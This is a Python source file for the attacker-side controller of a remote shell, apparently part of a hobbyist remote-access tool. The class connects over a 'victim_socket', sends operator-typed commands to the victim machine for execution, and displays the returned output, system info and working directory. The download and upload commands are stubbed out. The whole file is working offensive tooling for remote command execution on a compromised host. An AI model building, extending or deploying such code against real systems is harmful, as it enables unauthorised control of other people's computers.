import os
import threading
import time

from src.modlues.CLI.commmad_invoker import CommandInvoker
from src.modlues.protocols.general import GeneralPacket, GeneralPacketType
from src.modlues.protocols.protocol import SendPacket, PacketConstants, HandelPacket, Packet, PacketType
from src.modlues.protocols.remote_shell import RemoteShellPacket, RemoteShellPacketType


class RemoteShellAttackerSide:

    def __init__(self, victim_socket):
        self.victim_socket = victim_socket
        self.is_connected = False
        self.is_displayed = True
        self.victim_info = ''
        self.victim_cwd = ''

        self.mutex = threading.Lock()

        self.timeout_lock = None

        self.commands = dict()
        self.commands = {
            "download": self.__download,
            "upload": self.__upload,
            "exit": self.__exit,
        }

        self.command_invoker = CommandInvoker(self.commands)

    def main(self):
        self.__connect()

        threading.Thread(target=self.__admin_input).start()

        while self.is_connected:
            try:
                packet = HandelPacket.recv_packet(self.victim_socket)
                self.handle(packet)
            except Exception as e:
                print(e)
                self.is_connected = False

            else:
                pass

    def handle(self, packet: RemoteShellPacket):

        if packet.packet_sub_type == RemoteShellPacketType.OUTPUT.value:
            self.__print_in_light_blue(packet.payload.decode())

        if packet.packet_sub_type == RemoteShellPacketType.VICTIM_INFO.value:
            self.victim_info = packet.payload.decode()

        if packet.packet_sub_type == RemoteShellPacketType.CWD.value:
            self.victim_cwd = packet.payload.decode()

        if self.mutex.locked():
            self.mutex.release()

    def __connect(self):
        packet = GeneralPacket(GeneralPacketType.CONNECT_RSH)
        SendPacket.send_packet(self.victim_socket, packet)

        packet = HandelPacket.recv_packet(self.victim_socket)
        print(packet)

        if packet.packet_type == PacketType.GENERAL.value:
            if packet.packet_sub_type == GeneralPacketType.ACK.value:
                self.is_connected = True
        else:
            print('connection failed')

    def __admin_input(self):
        while self.is_connected:
            if not self.mutex.locked():
                print(f'{self.victim_info} {self.victim_cwd.split("/")[-1]} $ ', end='')
                command = input()
                if command:
                    if self.commands.get(command):
                        self.command_invoker.exec(command)
                    else:
                        packet = RemoteShellPacket(RemoteShellPacketType.COMMAND, command.encode())
                        SendPacket.send_packet(self.victim_socket, packet)
                        self.mutex.acquire()

    def __help(self, args: list = None):
        print('get some help')

    def __download(self):
        pass

    def __upload(self):
        pass

    def __exit(self):
        packet = RemoteShellPacket(RemoteShellPacketType.EXIT, payload=PacketConstants.NO_DATA)
        SendPacket.send_packet(self.victim_socket, packet)
        print(f"Disconnecting, {self.victim_socket}")
        self.is_connected = False

    def __print_in_light_blue(self, st: str):
        print('\33[94m' + st + '\33[0m', end='')
